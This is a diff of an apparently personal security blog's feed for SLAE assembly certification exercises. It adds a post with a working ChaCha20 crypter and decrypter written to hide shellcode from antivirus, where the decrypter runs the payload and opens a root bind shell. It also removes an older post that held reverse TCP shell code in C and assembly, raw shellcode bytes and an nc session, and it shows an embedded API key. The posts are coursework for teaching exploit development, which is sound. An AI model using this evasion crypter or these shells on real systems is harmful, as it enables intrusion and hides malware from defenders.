@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Slae | tcunha.github.io]]></title>
   <link href="http://tcunha.github.io/blog/categories/slae/atom.xml" rel="self"/>
   <link href="http://tcunha.github.io/"/>
-  <updated>2018-08-15T20:06:17+00:00</updated>
+  <updated>2018-08-22T19:58:17+00:00</updated>
   <id>http://tcunha.github.io/</id>
   <author>
     <name><![CDATA[tcunha]]></name>
@@ -12,6 +12,251 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SLAE 0x07: Crypter]]></title>
+    <link href="http://tcunha.github.io/blog/2018/08/21/slae-0x07-crypter/"/>
+    <updated>2018-08-21T00:50:25+00:00</updated>
+    <id>http://tcunha.github.io/blog/2018/08/21/slae-0x07-crypter</id>
+    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>This final exercise consists in using a custom crypter and decrypter to evade anti-virus engines, since signatures are used most of the time.</p>
+
+<p>They are both taking advantage of the <a href="https://wiki.openssl.org/index.php/EVP">EVP</a> functions provided by OpenSSL. The chosen algorithm was the <a href="https://cr.yp.to/chacha.html">ChaCha20</a> stream cipher with a random IV (12 bytes) and a key (32 bytes) retrieved on run-time. The key is the SHA256 of the <strong>id</strong> of the latest news of a <strong>configured</strong> section by using the public API provided by The Guardian.</p>
+
+<pre><code class="c crypter">#include &lt;openssl/conf.h&gt;
+#include &lt;openssl/err.h&gt;
+#include &lt;openssl/evp.h&gt;
+#include &lt;openssl/rand.h&gt;
+
+#include &lt;err.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#include "common.h"
+
+unsigned char shellcode[] = STR(SHELLCODE);
+
+int
+main(void)
+{
+    EVP_CIPHER_CTX  *ctx;
+    unsigned char    b[BUFSIZ];     /* Crypted buffer (should be enough). */
+    unsigned char    iv[12];        /* The IV length is 96 bits. */
+    unsigned char    key[32];       /* The key length is 256 bits. */
+    unsigned char   *ptr = b;
+    int              bl, ol;
+
+    common_key(key);                                /* Get dynamic key. */
+
+    if (RAND_bytes(iv, sizeof iv) == 0)             /* Get a random IV. */
+        CRYPTER_SSLERR();
+    if ((ctx = EVP_CIPHER_CTX_new()) == NULL)
+        CRYPTER_SSLERR();
+    if (EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, key, iv) == 0)
+        CRYPTER_SSLERR();
+    if (EVP_EncryptUpdate(
+        ctx, b, &amp;bl, shellcode, strlen((char *) shellcode)) == 0)
+        CRYPTER_SSLERR();
+    if (EVP_EncryptFinal_ex(ctx, b + bl, &amp;ol) == 0)
+        CRYPTER_SSLERR();
+
+    /* Check for NUL bytes in the crypted shellcode. */
+    while (ptr != b + bl + ol) {    /* Final buffer size is bl plus ol. */
+        if (*ptr == 0)
+            errx(1, "NUL byte found!"); /* There might be more! */
+        ptr++;
+    }
+
+    for (ptr = key; ptr != key + sizeof key; ptr++)
+        printf("\\x%02x", *ptr);
+    puts("");
+
+    /* Print the shellcode prefixed with the randomly generated IV. */
+    for (ptr = iv; ptr != iv + sizeof iv; ptr++)
+        printf("\\x%02x", *ptr);
+    for (ptr = b; ptr != b + bl + ol; ptr++)
+        printf("\\x%02x", *ptr);
+    puts("");
+
+    return (0);
+}
+</code></pre>
+
+<p>The common key retrieval code depends on cURL. Installing the header and library files, like with OpenSSL, is also needed:</p>
+
+<pre><code class="c key retrieval">#include &lt;curl/curl.h&gt;
+
+#include &lt;openssl/sha.h&gt;
+
+#include &lt;err.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+#define COMMON_APIKEY           "decfe466-4db7-4a7c-b0b8-f067cceaf94d"
+#define COMMON_BASE             "https://content.guardianapis.com"
+#define COMMON_ENDPOINT         "/search"
+#define COMMON_ENDPOINT_ARGS    "?section=science&amp;page-size=1&amp;api-key="
+#define COMMON_URL              \
+    COMMON_BASE                 \
+    COMMON_ENDPOINT             \
+    COMMON_ENDPOINT_ARGS        \
+    COMMON_APIKEY
+
+size_t
+common_write(char *ptr, size_t size, size_t nmemb, void *userdata)
+{
+    char    *buf = (char *) userdata;
+
+    strncpy(buf, ptr, BUFSIZ - 1);
+    buf[BUFSIZ - 1] = '\0';         /* Guarantee a NUL. */
+
+    return (nmemb * size);          /* Size is always 1; no overflow. */
+}
+
+void
+common_key(unsigned char *key)
+{
+    CURL            *curl;
+    char            *end;
+    const char      *start;
+    char             r[BUFSIZ];     /* Response (should be enough). */
+
+    if (curl_global_init(CURL_GLOBAL_ALL) != 0)
+        errx(1, "curl_global_init");
+    if ((curl = curl_easy_init()) == NULL)
+        errx(1, "curl_easy_init");
+    if (curl_easy_setopt(curl, CURLOPT_URL, COMMON_URL) != 0)
+        errx(1, "curl_easy_setopt");
+    if (curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, common_write) != 0)
+        errx(1, "curl_easy_perform");
+    if (curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *) &amp;r) != 0)
+        errx(1, "curl_easy_perform");
+    if (curl_easy_perform(curl) != 0)
+        errx(1, "curl_easy_perform");
+
+    /* Generate a key by finding the id and performing a SHA256 over it. */
+    if ((start = strstr(r, "id")) == NULL)
+        errx(1, "start not found");
+    start += 5;                             /* Go over the attribute. */
+
+    if ((end = strchr(start, '"')) == NULL)
+        errx(1, "end not found");
+    *end = '\0';                            /* Turn it into a NUL byte. */
+
+    /* The key needs to be 32 bytes. */
+    printf("Generating key from: %s\n", start);
+    SHA256((unsigned char *) start, strlen(start), key);
+}
+</code></pre>
+
+<pre><code class="c decrypter">#include &lt;openssl/conf.h&gt;
+#include &lt;openssl/err.h&gt;
+#include &lt;openssl/evp.h&gt;
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#include "common.h"
+
+unsigned char shellcode[] = STR(SHELLCODE);
+
+int
+main(void)
+{
+    EVP_CIPHER_CTX  *ctx;
+    unsigned char    b[BUFSIZ];
+    unsigned char    iv[12];        /* The IV length is 96 bits. */
+    unsigned char    key[32];       /* The key length is 256 bits. */
+    unsigned char   *ptr = shellcode + 12;
+    int              bl, ol;
+
+    common_key(key);                        /* Get dynamic key. */
+    memcpy(iv, shellcode, sizeof iv);       /* Save the prefixed IV. */
+
+    if ((ctx = EVP_CIPHER_CTX_new()) == NULL)
+        CRYPTER_SSLERR();
+    if (EVP_DecryptInit_ex(ctx, EVP_chacha20(), NULL, key, iv) == 0)
+        CRYPTER_SSLERR();
+    if (EVP_DecryptUpdate(
+        ctx, b, &amp;bl, ptr, strlen((char *) shellcode) - sizeof iv) == 0)
+        CRYPTER_SSLERR();
+    if (EVP_DecryptFinal_ex(ctx, b + bl, &amp;ol) == 0)
+        CRYPTER_SSLERR();
+
+    (*(void(*)(void)) b)();         /* Execute decrypted shellcode. */
+    return (0);                     /* NOTREACHED */
+}
+</code></pre>
+
+<p>Executing the crypter yields the following output. Like with the previous exercises, the shellcode to execute can be tweaked by the <strong>SHELLCODE</strong> variable:</p>
+
+<pre><code class="bash">$ make crypter SHELLCODE=../0x01-bind/bind
+Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
+\xeb\x97\x33\xb0\xf6\x5a\x73\x32\x31\x34\xc8\x00\x63\x34\x98\x8e\x47\x2d\xdc\x6f\xc4\x1f\x83\x81\xf9\x04\x1b\xc9\x96\x86\x6f\xe2
+\xcb\x1a\x5c\x61\x70\x5e\x82\x09\x59\x4f\xe6\x42\x1a\x62\xb9\xa6\x43\x09\xdf\x99\x33\x22\xf4\xfa\x41\xa5\x27\x6a\xe7\xfc\x76\x6a\x86\x5e\xa2\x8b\xf3\x3f\x5c\x90\xe9\xeb\x38\x4a\x0f\x30\xdb\x20\x4a\x8f\xcd\x8a\xa2\x53\xaf\xc4\x03\x1b\xe8\xf5\x9e\xe4\xed\xa6\x43\xc5\x92\xdd\xb9\x20\x0d\x1a\xb0\x95\xe7\x33\xd0\x44\x1b\x05\x47\x1c\x59\x3f\x99\xe1\xd2\x74\x62\x6d\x2b\x85\x55\xe2
+</code></pre>
+
+<p>The <strong>decrypter</strong> target already takes care of executing the crypter with the specified shellcode and extracting it from the above output:</p>
+
+<pre><code class="bash">$ make decrypter
+cc -W -Wall -Wformat=2 -fno-stack-protector -zexecstack -ggdb -DSHELLCODE=`./crypter|tail -n1`  -c -o decrypter.o decrypter.c
+cc -lcrypto -lcurl -zexecstack  decrypter.o common.o   -o decrypter
+# ./decrypter
+Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
+$ ss -nlt|grep 4242
+LISTEN     0      0                                                         *:4242                                                                  *:*
+$ nc 127.0.0.1 4242
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>Printing the contents of the decrypted buffer shows that the shellcode payload was correctly decrypted and is not gibberish unlike the original provided one:</p>
+
+<pre><code class="bash">(gdb) b 36
+Breakpoint 1 at 0xb22: file decrypter.c, line 36.
+(gdb) r
+Starting program: /attic/slae/exam/0x07-crypter/decrypter
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+[New Thread 0xb7a9bb40 (LWP 1008)]
+[Thread 0xb7a9bb40 (LWP 1008) exited]
+Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
+
+Thread 1 "decrypter" hit Breakpoint 1, main () at decrypter.c:36
+36              (*(void(*)(void)) b)();         /* Execute decrypted shellcode. */
+(gdb) x/10i b
+   0xbfffd648:  xor    eax,eax
+   0xbfffd64a:  xor    esi,esi
+   0xbfffd64c:  cdq
+   0xbfffd64d:  mov    ax,0x167
+   0xbfffd651:  push   0x2
+   0xbfffd653:  pop    ebx
+   0xbfffd654:  push   0x1
+   0xbfffd656:  pop    ecx
+   0xbfffd657:  int    0x80
+   0xbfffd659:  xchg   ebx,eax
+(gdb) x/10i ptr
+   0x40308c &lt;shellcode+12&gt;:     sti
+   0x40308d &lt;shellcode+13&gt;:     outs   dx,BYTE PTR ds:[esi]
+   0x40308e &lt;shellcode+14&gt;:     sar    dh,0xcc
+   0x403091 &lt;shellcode+17&gt;:     and    cl,BYTE PTR [edi+eiz*8+0x36aa830f]
+   0x403098 &lt;shellcode+24&gt;:     outs   dx,BYTE PTR ds:[esi]
+   0x403099 &lt;shellcode+25&gt;:     fmul   QWORD PTR [edx-0x6c]
+   0x40309c &lt;shellcode+28&gt;:     cmp    al,0xb5
+   0x40309e &lt;shellcode+30&gt;:     xchg   BYTE PTR [eax-0x58bfcbc1],dh
+   0x4030a4 &lt;shellcode+36&gt;:     or     ah,dl
+   0x4030a6 &lt;shellcode+38&gt;:     sub    ecx,esi
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[SLAE 0x06: Polymorphic Shellcodes]]></title>
@@ -314,7 +559,7 @@ Resolving aaaa (aaaa)... failed: Name or service not known.
 wget: unable to resolve host address 'aaaa'
 </code></pre>
 
-<p>To save space, pointer arithmeric operations on stack values are performed with the ebp register, instead of with esp. The offsets are, also, statically calculated by the code. The resulting morphed shellcode is 21 bytes bigger, making it the maximum 63 bytes allowed by the requirements:</p>
+<p>To save space, pointer arithmetic operations on stack values are performed with the ebp register, instead of with esp. The offsets are, also, statically calculated by the code. The resulting morphed shellcode is 21 bytes bigger, making it the maximum 63 bytes allowed by the requirements:</p>
 
 <pre><code class="asm">global _start
 
@@ -1120,7 +1365,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 <h3>2. linux/x86/shell_find_tag</h3>
 
-<p>This one is similar to the above, but instead of expecting a specific remote port on one of its file descriptors, it searches for a configure tag:</p>
+<p>This one is similar to the above, but instead of expecting a specific remote port on one of its file descriptors, it searches for a configured tag:</p>
 
 <pre><code class="asm">global _start
 
@@ -1373,7 +1618,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 <h3>3. linux/x86/read_file</h3>
 
-<p>The final shellcode reads the configured file and writes its contents to a specific file descriptor. Since the above skeleton C program will be used, the contents are going to be written to the remote client over the network on descriptor 4. Since it needs to obtain the absolute address in memory of the path to open, it is using the well known JMP/CALL/POP technique to avoid having 0x00 characters in the resulting shellcode:</p>
+<p>The final shellcode reads the configured file and writes its contents to a specific file descriptor. Since the above skeleton C program will be used, the contents are going to be written to the remote client over the network on descriptor 4. Since it needs to obtain the absolute address in memory of the path to open, it is using the well known JMP/CALL/POP technique to avoid having \x00 characters in the resulting shellcode:</p>
 
 <pre><code class="asm">global _start
 
@@ -1933,302 +2178,6 @@ uid=0(root) gid=0(root) groups=0(root)
 # ./shellcode
 Egghunter length: 33
 Second stage length: 70
-</code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SLAE 0x02: Reverse TCP Shell]]></title>
-    <link href="http://tcunha.github.io/blog/2018/05/21/slae-0x02-reverse-tcp-shell/"/>
-    <updated>2018-05-21T20:39:57+00:00</updated>
-    <id>http://tcunha.github.io/blog/2018/05/21/slae-0x02-reverse-tcp-shell</id>
-    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
-
-http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
-
-Student-ID: SLAE-1154
-</code></pre>
-
-<p>Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to call the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">connect(2)</a> function instead of accepting. There&rsquo;s also no need of binding, since the kernel will automatically choose an ephemeral port and determine the source IP address.</p>
-
-<pre><code class="c connect(2) prototype">int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-</code></pre>
-
-<p>Just like <a href="http://man7.org/linux/man-pages/man2/bind.2.html">bind(2)</a>, the second argument has to be manually packed with the IP address and port to connect to:</p>
-
-<pre><code class="bash retrieving the system call number and constants">$ asm-syscall connect
-#define __NR_connect 362
-0x16a
-$ python -c 'import socket; print socket.AF_INET'
-2
-</code></pre>
-
-<pre><code>+----------+--------------------+
-| register |       value        |
-+----------+--------------------+
-| eax      | 362                |      +---------------------------------+ H
-| ebx      | socket(2) fd       |      | IP address (network byte order) |
-| ecx      | esp pointer        +--&gt;&gt;--+ port (network byte order)       |
-| edx      | 16                 |      | AF_INET (2)                     |
-+----------+--------------------+      +---------------------------------+ L
-</code></pre>
-
-<pre><code class="c">#include &lt;sys/types.h&gt;
-#include &lt;sys/socket.h&gt;
-
-#include &lt;arpa/inet.h&gt;
-
-#include &lt;err.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;limits.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;strings.h&gt;
-#include &lt;unistd.h&gt;
-
-int
-main(int argc, char **argv)
-{
-    char                    *exec_argv[] = { "/bin/sh", NULL };
-    char                    *endptr;
-    int                      fd;
-    long                     port;
-    struct sockaddr_in       sa;
-
-    if (argc == 1)
-        errx(1, "usage: host port");
-
-    errno = 0;
-    port = strtol(argv[2], &amp;endptr, 10);
-    if (*endptr != '\0')
-        errx(1, "not a number");
-    if (errno == ERANGE || (port &lt;= 1024 || port &gt;= 65536))
-        errx(1, "port out of range");
-
-    if ((fd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
-        err(1, "socket");
-
-    bzero(&amp;sa, sizeof sa);
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr(argv[1]);
-    sa.sin_port = htons(port);
-
-    if (connect(fd, (struct sockaddr *) &amp;sa, sizeof sa) == -1)
-        err(1, "connect");
-
-    if (dup2(fd, STDIN_FILENO) == -1)
-        err(1, "dup2");
-    if (dup2(fd, STDOUT_FILENO) == -1)
-        err(1, "dup2");
-    if (dup2(fd, STDERR_FILENO) == -1)
-        err(1, "dup2");
-
-    execve(exec_argv[0], exec_argv, NULL);
-    err(1, "execve");
-
-    return (0); /* NOTREACHED */
-}
-</code></pre>
-
-<p>Again, one should just use <a href="http://man7.org/linux/man-pages/man3/getaddrinfo.3.html">getaddrinfo(3)</a> instead. This has the advantage of also being protocol agnostic:</p>
-
-<pre><code class="c">#include &lt;sys/types.h&gt;
-#include &lt;sys/socket.h&gt;
-
-#include &lt;err.h&gt;
-#include &lt;netdb.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-
-int
-reverse_try(struct addrinfo *p)
-{
-    int fd;
-
-    if ((fd = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol)) == -1) {
-        warn("socket");
-        return (-1);
-    }
-    if (connect(fd, p-&gt;ai_addr, p-&gt;ai_addrlen) == -1) {
-        close(fd);
-        warn("connect");
-        return (-1);
-    }
-
-    return (fd);
-}
-
-int
-main(int argc, char **argv)
-{
-    char            *exec_args[] = { "/bin/sh", NULL };
-    int              ai_ret, fd;
-    struct addrinfo  ai_hints;
-    struct addrinfo *ai_ptr, *ai_srv;
-
-    if (argc != 3)
-        errx(1, "usage: host port");
-
-    memset(&amp;ai_hints, 0, sizeof ai_hints);
-    ai_hints.ai_family = AF_UNSPEC;
-    ai_hints.ai_socktype = SOCK_STREAM;
-
-    if ((ai_ret = getaddrinfo(argv[1], argv[2], &amp;ai_hints, &amp;ai_srv)) == -1)
-        errx(1, "getaddrinfo: %s", gai_strerror(ai_ret));
-    for (ai_ptr = ai_srv; ai_ptr != NULL; ai_ptr = ai_ptr-&gt;ai_next) {
-        if ((fd = reverse_try(ai_ptr)) != -1)
-            break;
-    }
-    if (ai_ptr == NULL)
-        errx(1, "failed to connect");
-    freeaddrinfo(ai_srv);
-
-    if (dup2(fd, STDIN_FILENO) == -1)
-        err(1, "dup2");
-    if (dup2(fd, STDOUT_FILENO) == -1)
-        err(1, "dup2");
-    if (dup2(fd, STDERR_FILENO) == -1)
-        err(1, "dup2");
-
-    execve(exec_args[0], exec_args, NULL);
-    err(1, "execve");
-
-    return (0); /* NOTREACHED */
-}
-</code></pre>
-
-<p>As for the commented shellcode:</p>
-
-<pre><code class="asm">global _start
-
-section .text
-_start:
-    xor eax, eax
-    cdq                     ; set edx to zero as well, by sign extending eax
-
-    mov ax, 0x167           ; use mov instead of push imm16 and pop r16
-    ; int socket(int, int, int)
-    push 0x2                ; PF_INET
-    pop ebx                 ; domain
-    push 0x1                ; SOCK_STREAM
-    pop ecx                 ; type
-    ; edx (protocol) initialized to zero by the cdq instruction above
-    int 0x80
-
-    xchg ebx, eax           ; fd on ebx from this point below
-    mov ax, 0x16a           ; use mov instead of push imm16 and pop r16
-    ; int connect(int, const struct sockaddr *, socklen_t)
-    push HOST               ; host in network byte order
-    push word PORT          ; port in network byte order
-    push word 0x2           ; AF_INET
-    mov ecx, esp            ; addr
-    push 0x10               ; 16 bytes in total
-    pop edx                 ; addrlen
-    int 0x80
-
-    push 0x2
-    pop ecx                 ; newfd
-bind_dup2_loop:
-    push 0x3f
-    ; int dup2(int, int)
-    pop eax 
-    int 0x80
-    dec ecx
-    jns bind_dup2_loop      ; don't jump if ecx is positive
-
-    cdq                     ; eax is zero from the dup2(2) above (stdin fd)
-    push eax                ; to null terminate the filename
-    push 0xb
-    ; int execve(const char *, char *const [], char *const [])
-    pop eax
-    push 0x68732f6e         ; n/sh
-    push 0x69622f2f         ; //bi
-    mov ebx, esp            ; filename
-    inc ecx                 ; ecx (argv) is 0xffffffff from the above dup(2)
-    ; edx is already zero
-    int 0x80
-</code></pre>
-
-<p>To define the remote host and port, like with the bind shell, the configure script should be used with the -h (127.1.1.1 by default) and -r (4242/tcp by default) command-line options:</p>
-
-<pre><code class="bash">$ ./configure -h 127.2.2.2 -r 1337
-Using remote host: 0x0202027f
-Using listening port: 0x9210
-Using remote port: 0x3905
-$ ./configure -h 127.0.0.1 -r 1337
-Host contains NUL bytes!
-$ ./configure -h 127.3.3.3 -r 1280
-Port contains NUL bytes!
-$ ./configure
-Using remote host: 0x0101017f
-Using listening port: 0x9210
-Using remote port: 0x9210
-$ cd 0x02-reverse/
-$ make
-nasm  -f elf32 -o reverse.o reverse.asm
-ld -N -zexecstack -o reverse reverse.o
-08048060 &lt;_start&gt;:
- 8048060:       31 c0                   xor    eax,eax
- 8048062:       99                      cdq
- 8048063:       66 b8 67 01             mov    ax,0x167
- 8048067:       6a 02                   push   0x2
- 8048069:       5b                      pop    ebx
- 804806a:       6a 01                   push   0x1
- 804806c:       59                      pop    ecx
- 804806d:       cd 80                   int    0x80
- 804806f:       93                      xchg   ebx,eax
- 8048070:       66 b8 6a 01             mov    ax,0x16a
- 8048074:       68 7f 01 01 01          push   0x101017f
- 8048079:       66 68 10 92             pushw  0x9210
- 804807d:       66 6a 02                pushw  0x2
- 8048080:       89 e1                   mov    ecx,esp
- 8048082:       6a 10                   push   0x10
- 8048084:       5a                      pop    edx
- 8048085:       cd 80                   int    0x80
- 8048087:       6a 02                   push   0x2
- 8048089:       59                      pop    ecx
-
-0804808a &lt;bind_dup2_loop&gt;:
- 804808a:       6a 3f                   push   0x3f
- 804808c:       58                      pop    eax
- 804808d:       cd 80                   int    0x80
- 804808f:       49                      dec    ecx
- 8048090:       79 f8                   jns    804808a &lt;bind_dup2_loop&gt;
- 8048092:       99                      cdq
- 8048093:       50                      push   eax
- 8048094:       6a 0b                   push   0xb
- 8048096:       58                      pop    eax
- 8048097:       68 6e 2f 73 68          push   0x68732f6e
- 804809c:       68 2f 2f 62 69          push   0x69622f2f
- 80480a1:       89 e3                   mov    ebx,esp
- 80480a3:       41                      inc    ecx
- 80480a4:       cd 80                   int    0x80
-Shellcode size: 70
-\x31\xc0\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x93\x66\xb8\x6a\x01\x68\x7f\x01\x01\x01\x66\x68\x10\x92\x66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x99\x50\x6a\x0b\x58\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
-cc -DSHELLCODE=`asm-opcodes reverse` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
-</code></pre>
-
-<pre><code class="bash">$ nc -lv 127.1.1.1 4242
-Listening on [127.1.1.1] (family 0, port 4242)
-Connection from localhost 38844 received!
-id
-uid=0(root) gid=0(root) groups=0(root)
-# ./shellcode
-Shellcode length: 70
-</code></pre>
-
-<pre><code class="bash"># make strace
-Shellcode length: 70
-# head -n35 reverse.strace
-execve("./shellcode", ["./shellcode"], [/* 24 vars */]) = 0
-write(1, "Shellcode length: 70\n", 21)  = 21
-socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
-connect(3, {sa_family=AF_INET, sin_port=htons(4242), sin_addr=inet_addr("127.1.1.1")}, 16) = 0
-dup2(3, 2)                              = 2
-dup2(3, 1)                              = 1
-dup2(3, 0)                              = 0
-execve("//bin/sh", NULL, NULL)          = 0
 </code></pre>
 ]]></content>
   </entry>
